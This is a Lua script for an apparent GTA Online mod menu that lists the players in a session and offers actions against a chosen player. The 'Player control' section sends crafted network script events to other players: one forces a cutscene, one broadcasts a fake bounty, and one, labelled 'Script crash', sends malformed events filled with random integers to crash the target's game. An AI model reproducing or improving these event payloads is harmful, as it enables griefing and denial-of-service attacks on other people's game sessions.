local PLAYER = {}

function PLAYER.GetPlayers(ignore)
	local names = {}
	local ids = {}

	for i = 0, 32 do
		if player.is_valid(i) and i ~= ignore then
			local name = player.get_name(i)
			names[name] = i
			ids[i] = name
		end
	end

	return names, ids
end

function PLAYER.GetNicePlayers()
    local tbl = {}
    for i = 0, 32 do
		if player.is_valid(i) then
			local name = player.get_name(i)
            table.insert(tbl, {id = i, name = name})
		end
	end
    return tbl
end

local function SelectPlayer(ignore)
	local ids = {}
	for i = 0, 32 do
		if player.is_valid(i) and i ~= ignore then
			table.insert(ids, i)
		end
	end
	return ids[math.random(#ids)], ids
end

local function gen(tbl)
	local args = {}
	for i = 1, 51 do
		args[i] = math.random(-2147483648, 2147483647)
	end
	if tbl then
		for k, v in pairs(tbl) do
			args[k] = v
		end
	end
	return args
end

MENU = {}

local col = menu.get_color(menu_color.WindowBg)
local r, g, b, a = math.floor(col.x * 255), math.floor(col.y * 255), math.floor(col.z * 255), 255

local function GetTextSize(a)
    return a:len() * 5.5
end

local active

MENU.pages = {}

MENU.settings = {
    selection = 1,
    data = {}
}

function MENU.SetPage(id, tbl)
    MENU.settings.selection = 1
    MENU.settings.data = {}
    MENU.settings.page = tbl
    MENU.settings.page_id = id
    MENU.settings.page_name = tbl.id
end

function MENU.SelectPage(id)
    for k, v in ipairs(MENU.pages) do
        if v.id == id or k == id then
            MENU.SetPage(k, v)
            return
        end
    end
end

function OnFrame()
    if not active then return end
    if menu.is_menu_opened() then return end
    local x, y = menu.get_main_menu_pos_x(), menu.get_main_menu_pos_y()
    local w, h = menu.get_main_menu_size_x(), menu.get_main_menu_size_y()
    local page = MENU.settings.page
    if not page then return end

    draw.rect_filled(x, y, x + w, y + h, r, g, b, a, 0, 0)
    draw.text(x + (w - page.text_w) * .5, y, 255, 255, 255, 255, page.header)

    if not page.draw then return end

    page.draw(x, y + 40, w, h - 40, MENU.settings.selection)
end

local function handle_selection()
    local page = MENU.settings.page
    if not page.selection then return end
    page.selection(MENU.settings.selection)
end

local function handle_press()
    local page = MENU.settings.page
    if not page.press then return end
    page.press(MENU.settings.selection)
end

local function handle_arrow(right)
    local page = MENU.settings.page
    if not page.arrow then return end
    page.arrow(MENU.settings.selection, right)
end

local keys = {
    [46] = function() -- Del
        active = not active
    end,
    [34] = function() -- PgDown
        if not active then return end
        MENU.settings.selection = MENU.settings.selection + 1
        handle_selection()
    end,
    [33] = function() -- PgUp
        if not active then return end
        MENU.settings.selection = MENU.settings.selection - 1
        handle_selection()
    end,
    [13] = function() -- enter
        if not active then return end
        handle_press()
    end,
    [35] = function() -- End
        if not active then return end
        local now = MENU.settings.page_id
        for k,v in ipairs(MENU.pages) do
            if k > now and v.can_be_switched then
                MENU.SetPage(k, v)
                return
            end
        end
        MENU.SelectPage(1)
    end,
    [8] = function() -- backspace
        if not active then return end
        MENU.SelectPage(1)
    end,
    [37] = function() -- <-
        if not active then return end
        handle_arrow()
    end,
    [39] = function() -- ->
        if not active then return end
        handle_arrow(true)
    end,
}

function OnKeyPressed(key, down)
    if not down then return end
    local func = keys[key]
    if not func then return end
    func()
end

function MENU.AddPage(data)
    table.insert(MENU.pages, data)
    return #MENU.pages
end

function MENU.DelPage(id)
    for k, v in ipairs(MENU.pages) do
        if v.id == id then
            table.remove(k)
            return true
        end
    end
end

--[[
    Players
]]

local player_list = {}

local function GetFlags(ply)
    local flags = {}
    if player.index() == ply then
        table.insert(flags, "[ME]")
    end
    if player.is_god(ply) then
        table.insert(flags, "[GOD]")
    end
    if player.is_script_host(ply) then
        table.insert(flags, "[SH]")
    end
    if player.is_session_host(ply) then
        table.insert(flags, "[H]")
    end
    if player.is_rockstar_dev(ply) then
        table.insert(flags, "[R*]")
    end
    if player.is_modder(ply) then
        table.insert(flags, "[M]")
    end
    if player.is_friend(ply) then
        table.insert(flags, "[F]")
    end
    return #flags > 0 and (table.concat(flags, " ") .. " ") or ""
end

MENU.AddPage({
    id = "PLAYERS",
    header = "Player List",
    text_w = GetTextSize("Player List"),
    draw = function(x, y, w, h)
        for id, data in ipairs(player_list) do
            local prefix = MENU.settings.selection == id and "> " or ""
            draw.text(x + 20, y + (20 * id), 255, 255, 255, 255, prefix .. GetFlags(data.id) .. data.name)
        end
    end,
    selection = function(num)
        if num > #player_list then
            num = 1
        elseif num < 1 then
            num = #player_list
        end
        MENU.settings.selection = num
    end,
    press = function(num)
        MENU.SelectPage("PLAYER")
        MENU.settings.data = {id = num, index = player_list[num].id}
    end,
    can_be_switched = true
})

local function UpdatePlayers()
    player_list = PLAYER.GetNicePlayers()
end

function OnPlayerJoin()
    UpdatePlayers()
end

function OnPlayerLeft()
    UpdatePlayers()
end

function OnTransitionEnd()
    UpdatePlayers()
end

UpdatePlayers()

MENU.SelectPage("PLAYERS")

--[[
    PLAYERS FUNCTIONS
]]

local player_funcs = {
    {
        name = "Casino cutscene",
        func = function(ply)
            script.send(ply, 1889984715, 0)
            return true
        end
    },
    {
        name = "Set bounty",
        func = function(ply)
            local magic_f = script_global.new(1658176):at(9):get_long()
	        local magic_s = script_global.new(1658176):at(10):get_long()
            local anon = 1
            for _, v in ipairs(player_list) do
                script.send(v.id, -1906146218, ply, ply, 10000, 0, anon, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, magic_f, magic_s)
            end
            return true
        end
    },
    {
        name = "Script crash",
        func = function(ply)
            script.send(ply, 1256866538, 0, 1, 64, 64, 64, 64, 64, 64, 849451549, 64, 64)
		    script.send(ply, 1463355688, table.unpack(gen({[2] = -1139568479})))
            return true
        end
    },
}

MENU.AddPage({
    id = "PLAYER",
    header = "Player control",
    text_w = GetTextSize("Player control"),
    draw = function(x, y, w, h, selection)
        for id, data in ipairs(player_funcs) do
            local prefix = selection == id and "> " or ""
            draw.text(x + 20, y + (20 * id), 255, 255, 255, 255, prefix .. data.name)
        end
    end,
    press = function(num)
        local func = player_funcs[num].func
        if not func then
            utils.notify("Menu.lua", "Cant find function - " ..tostring(MENU.settings.selection), gui_icon.warning, notify_type.fatal)
            return
        end
        local ply = MENU.settings.data and MENU.settings.data.index
        if not ply or not player.is_valid(ply) then
            utils.notify("Menu.lua", "Cant find player", gui_icon.warning, notify_type.fatal)
            return
        end
        local success = func(ply)
        if success == true then
            utils.notify("Menu.lua", "Successfuly used", gui_icon.world, notify_type.default)
        else
            utils.notify("Menu.lua", success, gui_icon.warning, notify_type.fatal)
        end
    end,
    selection = function(num)
        if num > #player_funcs then
            num = 1
        elseif num < 1 then
            num = #player_funcs
        end
        MENU.settings.selection = num
    end,
})

--[[
    Togglers
]]

--[[
    Heists
]]

MENU.AddPage({
    id = "HEISTS",
    header = "Heist control",
    text_w = GetTextSize("Heist control"),
    draw = function(x, y, w, h)

    end,
    arrow = function(selection, right)

    end,
    can_be_switched = true,
})